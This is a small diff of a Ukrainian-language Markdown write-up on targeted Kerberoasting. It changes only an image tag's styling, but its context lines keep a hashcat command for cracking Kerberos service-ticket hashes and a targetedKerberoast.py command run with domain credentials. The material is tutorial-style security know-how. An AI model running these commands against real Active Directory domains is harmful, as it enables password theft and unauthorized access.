@@ -24,6 +24,6 @@ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
 ```
 python3 targetedKerberoast.py -d domain.local -u user1 -p complexpassword -v 
 ```
-<img width="1906" height="477" alt="image" src="https://github.com/user-attachments/assets/4957b15e-52fd-4965-bf59-88705bd77baf" />
+<img style="height:auto; max-width:100%"  alt="image" src="https://github.com/user-attachments/assets/4957b15e-52fd-4965-bf59-88705bd77baf" />
 Таким чином ми можемо отримати пароль користувача просто використовуючи права на запис SPN. 
 Дякую за читання, зустрінемося на просторах мережі)
